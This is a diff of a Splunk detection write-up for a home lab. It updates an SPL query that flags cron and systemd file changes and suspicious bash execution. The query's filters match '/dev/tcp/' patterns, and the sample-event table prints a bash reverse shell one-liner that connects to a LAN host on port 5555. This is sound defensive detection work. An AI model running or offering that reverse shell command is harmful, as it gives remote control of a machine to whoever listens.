@@ -11,6 +11,7 @@ Detect potential persistence and command execution techniques by identifying cro
 **SIEM:** Splunk Enterprise  
 **Log Sources:** Linux Auditd and Syslog
 **Auditd-Rules:** 
+
 ![Screenshot 2025-05-28 184409](https://github.com/user-attachments/assets/0ba380e1-3e95-4b31-ab54-17207b01a148)
 
 
@@ -48,30 +49,34 @@ Detect potential persistence and command execution techniques by identifying cro
 ### 🔎 SPL Query
 ```splunk
 index=linux_logs sourcetype=linux_audit (key="cron_mod" OR key="systemd_mod")
-| rex field=_raw "comm=\"(?<command>[^"]+)\""
-| rex field=_raw "exe=\"(?<exe>[^"]+)\""
-| rex field=_raw "success=(?<success>\w+)"
-| rex field=_raw "exit=(?<exit_code>[-\d]+)"
-| rex field=_raw "auid=(?<audit_uid>\d+)"
-| rex field=_raw "key=\"(?<mod_key>[^"]+)\""
-| eval user=if(audit_uid=="1000", "kali", "root_or_other")
-| eval status=if(success=="yes", "Success", "Failure")
-| eval description=case(
-    mod_key=="cron_mod" AND status=="Success", "This shows the actual cron file modification using " . exe,
-    mod_key=="systemd_mod" AND status=="Success", "This shows a systemd unit file was accessed/modified using " . exe,
-    true(), ""
-)
-| eval event_type="Cron or Systemd Modification"
-| table _time, host, event_type, command, exe, user, status, exit_code, mod_key, description
+    | rex field=_raw "comm=\"(?<command>[^\"]+)\""
+    | rex field=_raw "exe=\"(?<exe>[^\"]+)\""
+    | rex field=_raw "success=(?<success>\w+)"
+    | rex field=_raw "exit=(?<exit_code>[-\d]+)"
+    | rex field=_raw "auid=(?<audit_uid>\d+)"
+    | rex field=_raw "key=\"(?<mod_key>[^\"]+)\""
+    | eval user=if(audit_uid=="1000", "kali", "root_or_other")
+    | eval event_type=case(
+        mod_key=="cron_mod", "Cron Modification",
+        mod_key=="systemd_mod", "Systemd Modification",
+        true(), "Unknown Modification"
+    )
+    | eval description=case(
+        mod_key=="cron_mod" AND success=="yes", "Cron file modified using " . exe,
+        mod_key=="systemd_mod" AND success=="yes", "Systemd unit file modified using " . exe,
+        true(), ""
+    )
+    | eval command_line=command
+    | table _time, host, user, command_line, exe, event_type, description
 
 | append [
-    search index=linux_logs sourcetype=syslog
+    search index="linux_logs" sourcetype="syslog"
     | rex field=_raw "<Data Name=\"CommandLine\">(?<command_line>[^<]+)</Data>"
-    | rex field=_raw "<Data Name=\"Image\">(?<image>[^<]+)</Data>"
+    | rex field=_raw "<Data Name=\"Image\">(?<exe>[^<]+)</Data>"
+    | rex field=_raw "<Data Name=\"User\">(?<user>[^<]+)</Data>"
     | rex field=_raw "<Data Name=\"ParentImage\">(?<parent_image>[^<]+)</Data>"
     | rex field=_raw "<Data Name=\"ParentCommandLine\">(?<parent_cmd>[^<]+)</Data>"
-    | rex field=_raw "<Data Name=\"User\">(?<user>[^<]+)</Data>"
-    | rex field=_raw "<Data Name=\"CurrentDirectory\">(?<user_dir>[^<]+)</Data>"
+    | rex field=_raw "<Data Name=\"CurrentDirectory\">(?<current_dir>[^<]+)</Data>"
     | where (
         like(command_line, "%.sh%") OR
         like(command_line, "%/dev/tcp/%") OR
@@ -80,20 +85,33 @@ index=linux_logs sourcetype=linux_audit (key="cron_mod" OR key="systemd_mod")
     )
     AND NOT (
         like(command_line, "%xfce4-panel-genmon-vpnip.sh%") OR
-        like(image, "/usr/lib/x86_64-linux-gnu/%") OR
+        like(exe, "/usr/lib/x86_64-linux-gnu/%") OR
         like(command_line, "%/usr/share/kali-themes/%") OR
         like(command_line, "%/opt/splunkforwarder/%") OR
         like(command_line, "%pid_check.sh%")
     )
+    | search command_line!="/bin/bash -c chown -R splunkfwd:splunkfwd /opt/splunkforwarder"
     | eval event_type="Suspicious Bash Execution"
-    | table _time, host, event_type, command_line, image, parent_image, parent_cmd, user, user_dir
+    | eval description="Reverse shell attempt via bash"
+    | table _time, host, user, command_line, exe, event_type, description
 ]
 | sort -_time
+| rename _time AS "Time", exe AS "Executable", command_line AS "Command Line", event_type AS "Event Type", description AS "Description"
 ```
 ## Alert
 ---
 ## Log / Sample Event
-![Screenshot 2025-05-28 184253](https://github.com/user-attachments/assets/1adb765d-3eca-4117-8178-3b915aae264c)
+## Suspicious Activity and File Modifications
+
+| Time                         | Host | User | Command Line                                              | Executable       | Event Type                | Description                                                                 |
+|-----------------------------|------|------|-----------------------------------------------------------|------------------|---------------------------|-----------------------------------------------------------------------------|
+| 2025-05-28T18:08:10.248+0530 | kali | kali | tee                                                       | /usr/bin/tee     | Cron Modification         | Cron file modified using /usr/bin/tee                                       |
+| 2025-05-28T18:16:47.539+0530 | kali | kali | zsh                                                       | /usr/bin/zsh     | Systemd Modification       | Systemd unit file modified using /usr/bin/zsh                               |
+| 20:02.3                      | kali | root | /bin/sh -c /bin/bash -i >& /dev/tcp/192.168.1.7/5555 0>&1 | /usr/bin/dash    | Suspicious Bash Execution | Reverse shell attempt via bash                                              |
+| 20:02.2                      | kali | root | /bin/sh -c /bin/bash -i >& /dev/tcp/192.168.1.7/5555 0>&1 | /usr/bin/dash    | Suspicious Bash Execution | Reverse shell attempt via bash                                              |
+
+![image](https://github.com/user-attachments/assets/9104d747-a019-4f1c-aad1-ab1b47db4a7b)
+
 
 ---
 
